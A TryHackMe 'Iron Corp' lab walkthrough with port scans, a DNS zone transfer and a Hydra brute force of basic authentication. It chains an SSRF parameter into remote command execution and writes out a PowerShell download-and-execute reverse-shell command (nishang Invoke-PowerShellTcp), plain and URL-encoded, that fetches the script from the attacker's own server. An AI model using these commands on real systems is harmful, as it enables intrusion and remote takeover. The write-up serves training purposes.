<h1 align="center">Iron Corp</h1>
<p align="center">2025, August 9<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>460</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Can you get access to Iron Corp's system?</em>?<br>
<img width="80px" src="https://github.com/user-attachments/assets/3ca6aff2-34c6-43ea-89e8-01a22a793524"><br>
Access this walkthrough room clicking <a href="https://tryhackme.com/room/ironcorp">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/b7cf893f-e0ad-4b8e-9f53-46b54516f860"></p>

<br>

<p align="center">Practice <code>nmap</code>, <code>rustscan</code>, <code>dirb</code>, </p>

<br>

<h2>Task 1 . Iron Corp</h2>
<p>Iron Corp suffered a security breach not long time ago.<br>

You have been chosen by Iron Corp to conduct a penetration test of their asset. They did system hardening and are expecting you not to be able to access their system.<br>

The asset in scope is: ironcorp.me<br>

Note: Edit your config file and add ironcorp.me<br>

Note 2: It might take around 5-7 minutes for the VM to fully boot, so please be patient.<br>

Happy hacking!</p>

<p><em>Answer the questions below</em></p>

<br>

<p>1.1. user.txtbr>
<code>_____</code></p>

<br>

<p>1.2. root.txtbr>
<code>_____</code></p>


<br>

<h3>/etc/hosts</h3>

```bash
TargetIP     ironcorp.me
```

<h3>nmap</h3>

```bash
:~/IronCorp# nmap -p- -vv ironcorp.me
...
PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack ttl 128
135/tcp   open  msrpc         syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128
5985/tcp  open  wsman         syn-ack ttl 128
8080/tcp  open  http-proxy    syn-ack ttl 128
11025/tcp open  unknown       syn-ack ttl 128
49667/tcp open  unknown       syn-ack ttl 128
49670/tcp open  unknown       syn-ack ttl 128
```

<br>

```bash
:~/IronCorp# nmap -sS -Pn -p- ironcorp.me
...
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
11025/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
```

<br>

<h3>rustscan</h3>

<p>
 
- <code>&nbsp;&nbsp;&nbsp;53</code> : domain?<br>
- <code>&nbsp;&nbsp;135</code> : msrpc : Microsoft Windows RPC<br>
- <code>&nbsp;3389</code> : ms-wbt-server : Microsoft Terminal Services<br>
- <code>;&nbsp;5985</code> : http : Microsoft-HTTPAPI/2.0<br>
- <code>&nbsp;8080</code> : http : Microsoft-IIS/10.0<br>
- <code>11025</code> : http : syn-ack Apache httpd 2.4.41 : TRACE<br>
- <code>49667</code> : msrpc : Microsoft Windows RPC<br>
- <code>49670</code> : msrpc : Microsoft Windows RPC</p>

```bash
:~/IronCorp# rustscan -a xx.xx.xx.xxx --ulimit 5500 -b 65535 -- -A -Pn
...
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2025-xx-xxTxx:xx:xx+00:00
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Issuer: commonName=WIN-8VMBKF3G815
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-xx-xxTxx:xx:xx
| Not valid after:  2026-xx-xxTxx:xx:xx
| MD5:   9278 1461 c030 09f6 3d60 0acd 12e5 d20a
| SHA-1: 56dc 8460 f7cf 4a05 fe76 7c81 3ba1 2e21 3eda 2b85
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQWRcbnyVb4ZVHx7fpg2OI/DANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tOFZNQktGM0c4MTUwHhcNMjUwNzMxMDA0ODQzWhcNMjYw
| MTMwMDA0ODQzWjAaMRgwFgYDVQQDEw9XSU4tOFZNQktGM0c4MTUwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2cMoTwqE64A4Z4Yg9VFqmSXm12cbf1fhF
| yHH/jLSfQpdtqMhJp+L1LKeby2WTDJI7l72OvKVVCmaDPu1cFWoWOn76hBsGHG67
| KOWiNJ3lWYnuQYmxB+hVfr7svtrZGO+kn8SyNnIuFrwHyC+7E1/a8upq8wbCtDtU
| 6FXJ7tCeu4ipKWi2ZCgEEK1GNjcRWrePQQWUsmtv8gs2mFFrEMUZAClDHki7x3mb
| wATiMgJr++n/dV1YAGvUBvhCkuMNrCjyeTLA4kSai/JY+uB80OGU4YNExPs/veHE
| noga5/UsoJmy3KqOQqyt48RX9VRMxQlspHGTvXYpP5jzvAW0j9J9AgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAtdym7fBomxFIQM25wR8NNdWyY9UWyCpUe4U2HPiUoCp9g5QaG0RvgTU+
| u3JeR2i5zYmXh0gJqJ1CMskUDt4uncpfDtFE4NAhDma+6TwleB4nVaTAx7ExNiBQ
| VyvtyW2b6hMm3gFVHjdXz3VyF/F4uQfooi2QcELmDnapNFKcugpXa3l8eK0SjGQD
| 7CL3Y7D4P7B4lThHqtkEfa0VZdExB8Ku4NGZcOaV8cEcJ82QEcpEX2B6IHEG94rk
| eqDo7JphpRmrTFVMEevsUfG4CIQFesyvPxtC0OSiSnC7c38isAuokbAAB/wvfXMv
| DhIOctQDwqctVRPklaMvpydWlkMnOQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-xx-xxTxx:xx:xx+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
11025/tcp open  http          syn-ack Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
|_http-title: Coming Soon - Start Bootstrap Theme
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

<br>

<h3>dirb</h3>
<br>
<p>xx.xxx.xx.xxx:<code>8080</code><br>

- /index.html<br>
- /assets/ <br>
- /assets/css/<br>
- /assets/flags/<br>
- /assets/flags/1x1/<br>
- /assets/fonts/<br>
- /assets/images/ <br>
- /assets/images/gallery/<br>
- /assets/images/timeline/<br>
- /assets/images/favicon.ico<br>
- /assets/Images/<br>
- /assets/Images/gallery/<br>
- /assets/Images/timeline/<br>
- /assets/js/<br>
- /assets/plugins/</p>

```bash
:~/IronCorp# dirb http://xx.xxx.xx.xxx:8080
...                                                        

---- Scanning URL: http://xx.xxx.xx.xxx:8080/ ----
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/                                                                                                                                                                                           
+ http://xx.xxx.xx.xxx:8080/index.html (CODE:200|SIZE:20040)                                                                                                                                                                               
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/ ----
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/css/                                                                                                                                                                                       
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/flags/                                                                                                                                                                                     
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/fonts/                                                                                                                                                                                     
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/images/                                                                                                                                                                                    
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/Images/                                                                                                                                                                                    
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/js/                                                                                                                                                                                        
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/plugins/                                                                                                                                                                                   
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/css/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/flags/ ----
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/flags/1x1/                                                                                                                                                                                 
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/fonts/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/images/ ----
+ http://xx.xxx.xx.xxx:8080/assets/images/favicon.ico (CODE:200|SIZE:1150)                                                                                                                                                                 
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/images/gallery/                                                                                                                                                                            
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/images/timeline/                                                                                                                                                                           
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/Images/ ----
+ http://xx.xxx.xx.xxx:8080/assets/Images/favicon.ico (CODE:200|SIZE:1150)                                                                                                                                                                 
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/Images/gallery/                                                                                                                                                                            
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/Images/timeline/                                                                                                                                                                           
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/js/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/plugins/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/flags/1x1/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/images/gallery/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/images/timeline/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/Images/gallery/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/Images/timeline/ ----
                                                                                                                                                                                                                                           
-----------------
```

<br>
<p>xx.xxx.xx.xxx:<code>11025</code><br>
 
- /aux<br>
- /cgi-bin/<br>
- /com1<br>
- /com2<br>
- /com3<br>
- /con<br>
- /css/<br>
- /img/<br>
- /examples<br>
- /index.html<br>
- /js/<br>
- /license<br>
- /LICENSE<br>
- /licenses<br>
- /lpt1<br>
- /lpt2<br>
- /nul<br>
- /phpmyadmin<br>
- /prn<br>
- /server-info<br>
- /server-status<br>
- /vendor/<br>
- /webalizer</p>

```bash
:~/IronCorp# dirb http://xx.xxx.xx.xxx:11025
...
---- Scanning URL: http://xx.xxx.xx.xxx:11025/ ----
+ http://xx.xxx.xx.xxx:11025/aux (CODE:403|SIZE:1047)                                                                                                              
+ http://xx.xxx.xx.xxx:11025/cgi-bin/ (CODE:403|SIZE:1061)                                                                                                         
+ http://xx.xxx.xx.xxx:11025/com1 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/com2 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/com3 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/con (CODE:403|SIZE:1047)                                                                                                              
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/css/                                                                                                                     
+ http://xx.xxx.xx.xxx:11025/examples (CODE:503|SIZE:1061)                                                                                                         
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/img/                                                                                                                     
+ http://xx.xxx.xx.xxx:11025/index.html (CODE:200|SIZE:2739)                                                                                                       
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/js/                                                                                                                      
+ http://xx.xxx.xx.xxx:11025/license (CODE:200|SIZE:1093)                                                                                                          
+ http://xx.xxx.xx.xxx:11025/LICENSE (CODE:200|SIZE:1093)                                                                                                          
+ http://xx.xxx.xx.xxx:11025/licenses (CODE:403|SIZE:1206)                                                                                                         
+ http://xx.xxx.xx.xxx:11025/lpt1 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/lpt2 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/nul (CODE:403|SIZE:1047)                                                                                                              
+ http://xx.xxx.xx.xxx:11025/phpmyadmin (CODE:403|SIZE:1047)                                                                                                       
+ http://xx.xxx.xx.xxx:11025/prn (CODE:403|SIZE:1047)                                                                                                              
+ http://xx.xxx.xx.xxx:11025/server-info (CODE:403|SIZE:1206)                                                                                                      
+ http://xx.xxx.xx.xxx:11025/server-status (CODE:403|SIZE:1206)                                                                                                    
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/vendor/                                                                                                                  
+ http://xx.xxx.xx.xxx:11025/webalizer (CODE:403|SIZE:1047)                                                                                                        
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
```

<br>

<h3>dig</h3>

<p>

- <code>ironcorp.me</code>
- <code>admin.ironcorp.me</code><br>
- <code>internal.ironcorp.me</code>
</p>

```bash
:~/IronCorp# dig axfr ironcorp.me @TargetIP

; <<>> DiG 9.18.28-0ubuntu0.20.04.1-Ubuntu <<>> axfr ironcorp.me @TargetIP
;; global options: +cmd
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
admin.ironcorp.me.	3600	IN	A	127.0.0.1
internal.ironcorp.me.	3600	IN	A	127.0.0.1
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 480 msec
;; SERVER:TargetIP#53(TargetIP) (TCP)
;; WHEN: Fri Aug 01 03:53:39 BST 2025
;; XFR size: 5 records (messages 1, bytes 238)
```

<br>
<h3>/etc/hosts</h3>

```bash
TargetIP ironcorp.me admin.ironcorp.me internal.ironcorp.me
```

<br>



<p>

- ironcorp.me:8080<br>
----- <code>Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent</code><br>
- internal.ironcorp.me:8080<br>
----- <code>Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent</code><br>
----- <code>/assets/js/pace.min.js</code> : 200<br>
----- <code>/assets/plugins/vectormap/jquery-jvectormap-2.0.2.css</code> : 400<br>
----- <code>/110x110</code> -<br>
----- <code>/assets/js/jquery.min.js</code> 200<br>
----- <code>/assets/plugins/simplebar/js/simplebar.js</code> : 200<br>
----- <code>/assets/js/bootstrap.min.js</code> : 200<br>
----- <code>/assets/js/popper.min.js</code> : 200<br>
----- <code>assets/js/sidebar-menu.js</code> : 200<br>
----- <code>/assets/js/jquery.loading-indicator.js</code> : 404<br>
----- <code>/assets/js/app-script.js</code> : 200<br>
----- <code>/assets/plugins/Chart.js/Chart.min.js</code> : 200<br>
----- <code> /assets/js/index.js</code> : 200<br>
- admin.ironcorp.me:11025 --> Authentication required!<br>
----- Authorization: Basic <code>YWRtaW46YWRtaW4=</code> = <code>admin</code> : <code>admin</code> == Authentication required!<br>
----- Authorization: Basic <code>YWRtaW46cGFzc3dvcmQxMjM=</code> = <code>admin</code> : <code>password123</code> == Hello<br>
---------- Response = <code>method="GET"</code>, <code>action="#"</code>, <code>name="r"</code>, <code>type="submit"</code><br>
---------- Search = <code>ls</code> = 200 OK = <code>/?r=ls#</code></p>

<br>
<br>
<h3>ironcorp.me:8080</h3>

<img width="1126" height="716" alt="image" src="https://github.com/user-attachments/assets/f85ee496-57c0-4e3e-b1d8-77c9613c3dc1" />

<br>
<h3>admin.ironcorp.me:11025</h3>

<img width="1125" height="345" alt="image" src="https://github.com/user-attachments/assets/ab6aab11-a423-4104-80e6-c4c7b7f31eb4" />

<br>

<img width="1135" height="683" alt="image" src="https://github.com/user-attachments/assets/6ef0b3d3-6b20-48f1-aa3f-1fe7a4d2b77b" />





<h3>ironcorp.me:8080/login.html</h3>

<img width="1056" height="509" alt="image" src="https://github.com/user-attachments/assets/d828e3b1-9a44-44e0-9a56-9b00096c7ca1" />

<h3>ironcorp.me:11025</h3>

<img width="1062" height="351" alt="image" src="https://github.com/user-attachments/assets/15487d11-affb-4284-a147-0a8074d3b687" />

<img width="1062" height="320" alt="image" src="https://github.com/user-attachments/assets/85872486-4a9a-4337-8340-21d9369b4a2c" />

<img width="1200" height="645" alt="image" src="https://github.com/user-attachments/assets/b669a368-1610-4d97-9721-dd2185b01baa" />


<h3>Hydra</h3>

<p>admin: password123</p>

```bash
:~/IronCorp# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 11025 admin.ironcorp.me http-get '/'
```


<img width="1099" height="126" alt="image" src="https://github.com/user-attachments/assets/b0b16af0-ccd0-43d9-b719-fe1c44d2e03d" />

<img width="1200" height="636" alt="image" src="https://github.com/user-attachments/assets/c395a147-5819-4c0d-95a5-106719691c5e" />

<img width="1195" height="505" alt="image" src="https://github.com/user-attachments/assets/ce5bcf6d-4983-443a-8521-9fad53161fc0" />



<h3>Repeater</h3>

<img width="1191" height="209" alt="image" src="https://github.com/user-attachments/assets/4ff48264-3d11-4720-9f66-bf45151a2b37" />

<img width="1188" height="382" alt="image" src="https://github.com/user-attachments/assets/30bbb507-dd18-4fd7-b735-fcd74cc907bc" />

<img width="1171" height="629" alt="image" src="https://github.com/user-attachments/assets/5eff7c69-215d-434a-9611-06ddc20ad92c" />


<h3>http server</h3>

```bash
:~/IronCorp# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<img width="1194" height="271" alt="image" src="https://github.com/user-attachments/assets/4a35e071-6687-401e-afd2-eb437a2dfbd0" />

<img width="1098" height="112" alt="image" src="https://github.com/user-attachments/assets/8288f1d0-67d0-438c-94ce-3be97c0d29db" />

<img width="1060" height="606" alt="image" src="https://github.com/user-attachments/assets/0f4d65a9-87a5-4556-acbe-152f9c026ee2" />


<img width="1192" height="414" alt="image" src="https://github.com/user-attachments/assets/eb8146ac-fd8d-4b78-b3dc-12abfaf06c28" />

<img width="1058" height="287" alt="image" src="https://github.com/user-attachments/assets/7ba8b9a3-3c68-46cd-a6bc-64de0d236ea1" />

<img width="1060" height="282" alt="image" src="https://github.com/user-attachments/assets/24e9a1fe-38ce-4487-a240-89c5a74cd7dd" />

<p>hi</p>

<img width="1192" height="268" alt="image" src="https://github.com/user-attachments/assets/8c67a9c1-cf80-40eb-82d5-8105d91fa125" />

<p>whoami</p>

<img width="1059" height="233" alt="image" src="https://github.com/user-attachments/assets/91c8c4fe-5d2e-4ebc-b81b-8f0383d83135" />


<h3>Invoke-Powershell</h3>

<img width="862" height="313" alt="image" src="https://github.com/user-attachments/assets/a5ed30ba-3a31-4fcb-85cf-23f04bee0d3c" />


```bash
:~/IronCorp# https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellIcmp.ps1
```

```bash
:~/IronCorp# mv Invoke-PowerShellIcmp.ps1 shell.ps1
```



:~/IronCorp# git clone https://github.com/samratashok/nishang.git
Cloning into 'nishang'...
remote: Enumerating objects: 1705, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 1705 (delta 5), reused 8 (delta 2), pack-reused 1691 (from 1)
Receiving objects: 100% (1705/1705), 10.89 MiB | 18.55 MiB/s, done.
Resolving deltas: 100% (1064/1064), done.
root@ip-10-10-210-152:~/IronCorp# cd nishang
root@ip-10-10-210-152:~/IronCorp/nishang# ls
ActiveDirectory  CHANGELOG.txt   Execution  MITM          Prasadhak  Utility
Antak-WebShell   Client          Gather     nishang.psm1  README.md
Backdoors        DISCLAIMER.txt  LICENSE    Pivot         Scan
Bypass           Escalation      Misc       powerpreter   Shells
:~/IronCorp/nishang# cd Shells
:~/IronCorp/nishang/Shells# ls
Invoke-ConPtyShell.ps1               Invoke-PowerShellTcp.ps1
Invoke-JSRatRegsvr.ps1               Invoke-PowerShellUdpOneLine.ps1
Invoke-JSRatRundll.ps1               Invoke-PowerShellUdp.ps1
Invoke-PoshRatHttp.ps1               Invoke-PowerShellWmi.ps1
Invoke-PoshRatHttps.ps1              Invoke-PsGcatAgent.ps1
Invoke-PowerShellIcmp.ps1            Invoke-PsGcat.ps1
Invoke-PowerShellTcpOneLineBind.ps1  Remove-PoshRat.ps1
Invoke-PowerShellTcpOneLine.ps1
root@ip-10-10-210-152:~/IronCorp/nishang/Shells# tail Invoke-PowerShellTcp.ps1
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

:~/IronCorp/nishang/Shells# nano Invoke-PowerShellTcp.ps1
:~/IronCorp/nishang/Shells# powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]


<img width="1193" height="356" alt="image" src="https://github.com/user-attachments/assets/10c21602-5c84-49da-aafe-f70865d92a02" />

:~/IronCorp/nishang/Shells# ls
Invoke-ConPtyShell.ps1  Invoke-PoshRatHttp.ps1     Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellUdpOneLine.ps1  Invoke-PsGcatAgent.ps1
Invoke-JSRatRegsvr.ps1  Invoke-PoshRatHttps.ps1    Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellUdp.ps1         Invoke-PsGcat.ps1
Invoke-JSRatRundll.ps1  Invoke-PowerShellIcmp.ps1  Invoke-PowerShellTcp.ps1             Invoke-PowerShellWmi.ps1         Remove-PoshRat.ps1
:~/IronCorp/nishang/Shells# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


powershell.exe -c iex(new-object net.webclient).downloadstring(http://10.10.210.152:8000/Invoke-PowerShellTcp.ps1')
%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%31%38%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%31%25%33%30%25%32%65%25%33%32%25%33%31%25%33%30%25%32%65%25%33%31%25%33%35%25%33%32%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39

http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=Equinox


